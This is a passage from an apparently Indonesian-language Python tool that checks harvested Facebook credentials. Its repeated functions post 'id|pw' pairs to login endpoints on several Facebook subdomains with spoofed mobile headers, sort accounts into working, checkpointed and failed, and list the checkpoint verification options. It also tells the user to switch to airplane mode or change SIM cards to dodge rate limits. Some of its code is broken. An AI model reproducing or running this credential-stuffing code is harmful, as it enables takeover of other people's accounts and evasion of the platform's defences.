							print('\r%s >> %s%s'%(G,opsii.text,J))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(H,id,pw,J))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(J,H))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,J))
				apkgey()
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(J,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def gans3():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Check Opsi') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilihan Tidak Ada Dimenu') 
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi3()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()
def cek_opsi3():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c))
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Proses Check Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(B,kes,J))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,B))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://m.facebook.com')
			ho = parser(ses.post('https://m.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://m.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(K,id,pw,J))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(J,H))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(G,opsii.text,J))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(H,id,pw,J))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(J,H))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,J))
				apkgey()
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(J,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres')
	exit()
	
def gans4():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Check Opsi') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Alan Dicek')
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilihan Tidak Ada Dimenu') 
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi4()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan')
				time.sleep(2)
				back()
def cek_opsi4():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Proses Check Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(B,kes,J))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,B))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "touch.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://touch.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://touch.facebook.com')
			ho = parser(ses.post('https://touch.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://touch.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(K,id,pw,J))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(J,H))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(G,opsii.text,J))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(H,id,pw,J))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(J,H))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,J))
				apkgey()
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(J,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def gans5():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Check Opsi') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Akan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilihan Tidak Ada Dimenu') 
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi5()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()
def cek_opsi5():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Proses Check Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(B,kes,J))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,B))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "x.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://x.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://xvulkanikpp.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://x.facebook.com')
			ho = parser(ses.post('https://x.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://x.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(K,id,pw,J))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(J,H))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(G,opsii.text,J))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(H,id,pw,J))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(J,H))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,J))
				apkgey()
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(J,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def gans6():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Check Opsi') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Alan Dicek') 
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilihan Tidak Ada Dimenu') 
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi6()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()
def cek_opsi6():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Proses Check Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(B,kes,J))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,B))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "free.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://free.facebook.com')
			ho = parser(ses.post('https://free.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://free.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(K,id,pw,J))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(J,H))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(G,opsii.text,J))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(H,id,pw,J))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(J,H))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,J))
				apkgey()
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(J,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def gans7():
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Check Opsi') 
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilih File Yang Akan Dicek') 
	my_files = []
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m►\x1b[38;5;208m>_Tidak Ada Hasil Untuk Dicek') 
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' >_ '+str(len(hem))+' Akun'+x)
		print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih File Yang Alan Dicek')
		geeh = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Pilihan Tidak Ada Dimenu') 
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi7()
			except IOError:
				print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_File Tidak Ditemukan') 
				time.sleep(2)
				back()
def cek_opsi7():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;208m>_Proses Check Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(B,kes,J))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,B))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "d.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://d.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://d.facebook.com')
			ho = parser(ses.post('https://d.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://d.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s >> %s|%s >> CP       %s'%(K,id,pw,J))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s >> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(J,H))
					else:
						for opsii in opsi:
							print('\r%s >> %s%s'%(G,opsii.text,J))
				except:
					print('\r%s >> %s|%s >> CP       %s'%(H,id,pw,J))
					print('\r%s>_Tidak Dapat Mengecek Opsi%s'%(J,H))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s >> %s|%s >> OK       %s'%(H,id,pw,J))
				apkgey()
			else:
				print('\r%s >>%s|%s  >> SALAH       %s'%(J,id,pw,M))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Koneksi Internet Bermasalah') 
			exit()
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Beres') 
	exit()

def metodff():
	jalan('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[38;5;46m>_Pilih Methode') 
	print('\x1b[38;5;226m► %s[01]%s>_Methode b-api '%(K,P))
	print('\x1b[38;5;226m► %s[02]%s>_Methode mbasic '%(H,P))
	print('\x1b[38;5;226m► %s[03]%s>_Methode mobile '%(B,P)) 
	print('\x1b[38;5;226m► %s[04]%s>_Methode touch '%(U,P)) 
	print('\x1b[38;5;226m► %s[05]%s>_Methode x FB '%(J,P))
	print('\x1b[38;5;226m► %s[06]%s>_Methode free FB '%(O,P))
	print('\x1b[38;5;226m► %s[07]%s>_Methode d FB '%(M,P))
	print('\x1b[38;5;226m► %s[00]%s>_Exit '%(P,M))
	ggcoy = input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \x1b[0;96m>_Pilih  : ') 
	if ggcoy in ['1','01']:
		file()
	elif ggcoy in ['2','02']:
		file2() 
	elif ggcoy in ['3','03']:
		file3() 
	elif ggcoy in ['4','04']:
		file4()
	elif ggcoy in ['5','05']:
		file5()
	elif ggcoy in ['6','06']:
		file6()
	elif ggcoy in ['7','07']:
		file7()
	elif ggcoy in ['0','00']:
		jalan('>_Thanksss')
		menu()
	
def bacok():
	bacek()
def bacek():
	c = len(akun)
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)) 
	input('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► \033[33m>_Mulai')
	print('\x1b[38;5;226m►\x1b[38;5;46m►\x1b[38;5;196m► >_Proses Check Dimulai') 
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s >> %s >> Error      %s'%(K,kes,M))
				print('\r%s>_ Pemisah Tidak Didukung Untuk Program Ini%s'%(J,M))
				continue
			bi = random.choice([K,P,H,M,J,B])
			print('\r%s >> %s/%s >> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "b-api.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://b-api.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://b-api.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://b-api.facebook.com')
			ho = parser(ses.post('https://b-api.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://b-api.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
